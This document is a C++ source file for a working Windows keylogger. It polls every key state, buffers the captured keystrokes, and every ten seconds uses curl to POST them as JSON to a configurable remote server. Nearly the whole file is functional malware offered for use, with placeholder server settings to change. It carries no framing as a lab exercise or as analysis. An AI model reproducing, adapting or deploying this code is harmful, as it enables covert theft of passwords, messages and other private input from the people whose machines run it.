// key_sender.cpp
// Simple Windows key-capture + periodic POST using curl.exe
// Works with MinGW-w64 (GCC >= 4.8). Compile with -std=c++11 or newer.

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <mutex>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cctype>

std::string text;
std::mutex text_mutex;

// server settings - change these to your server
const std::string ip_address = "192.168.1.8";
const std::string port_number = "8000";
const int time_interval = 10; // seconds

// convert basic virtual-key code to printable character (very basic)
char vkey_to_char(int vk) {
    // letters A-Z
    if (vk >= 'A' && vk <= 'Z') {
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        char c = static_cast<char>(vk);
        if (!shift) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
        return c;
    }

    // numbers 0-9
    if (vk >= '0' && vk <= '9') return static_cast<char>(vk);

    switch (vk) {
        case VK_SPACE: return ' ';
        case VK_OEM_PERIOD: return '.';
        case VK_OEM_COMMA: return ',';
        case VK_OEM_MINUS: return '-';
        case VK_OEM_PLUS:  return '=';
        case VK_RETURN: return '\n';
        case VK_TAB: return '\t';
        default: return 0;
    }
}

// basic key-capture using GetAsyncKeyState
void key_capture_loop() {
    while (true) {
        for (int vk = 8; vk <= 255; ++vk) {
            SHORT state = GetAsyncKeyState(vk);
            if (state & 0x8000) { // key down
                char c = vkey_to_char(vk);
                {
                    std::lock_guard<std::mutex> lock(text_mutex);
                    if (c) {
                        text.push_back(c);
                    } else {
                        if (vk == VK_BACK) text += "[BKSP]";
                        else if (vk == VK_ESCAPE) text += "[ESC]";
                        else if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) { /* ignore */ }
                        // you can add more mappings here
                    }
                }
                // small debounce to avoid overwhelming repetitions
                std::this_thread::sleep_for(std::chrono::milliseconds(120));
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
}

// escape JSON string
std::string json_escape(const std::string &s) {
    std::ostringstream o;
    for (unsigned char ch : s) {
        switch (ch) {
            case '\\': o << "\\\\"; break;
            case '"':  o << "\\\""; break;
            case '\b': o << "\\b";  break;
            case '\f': o << "\\f";  break;
            case '\n': o << "\\n";  break;
            case '\r': o << "\\r";  break;
            case '\t': o << "\\t";  break;
            default:
                if (ch < 0x20) {
                    o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)ch;
                } else {
                    o << ch;
                }
        }
    }
    return o.str();
}

// periodic sender: make JSON, write to temp file, call curl.exe to POST
void send_post_req() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(time_interval));

        std::string payload;
        {
            std::lock_guard<std::mutex> lock(text_mutex);
            if (text.empty()) continue;
            payload = "{\"keyboardData\":\"" + json_escape(text) + "\"}";
            text.clear();
        }

        const std::string filename = "payload_temp.json";
        {
            std::ofstream ofs(filename, std::ios::binary);
            if (!ofs) {
                std::cerr << "Failed to write temp file\n";
                continue;
            }
            ofs << payload;
        }

        // POST using system curl - Windows 10+ includes curl by default
        std::string cmd = "curl -s -X POST http://" + ip_address + ":" + port_number +
                          " -H \"Content-Type: application/json\" --data @" + filename;
        int rc = system(cmd.c_str());
        if (rc != 0) {
            std::cerr << "curl returned " << rc << "\n";
        } else {
            std::cout << "Payload sent (" << payload.size() << " bytes)\n";
        }

        // remove temp file
        remove(filename.c_str());
    }
}

int main() {
    std::cout << "Starting key capture + sender (Press Ctrl+C to stop)...\n";
    std::thread t_logger(key_capture_loop);
    std::thread t_sender(send_post_req);

    t_logger.detach();
    t_sender.detach();

    // keep program alive
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(60));
    }
    return 0;
}
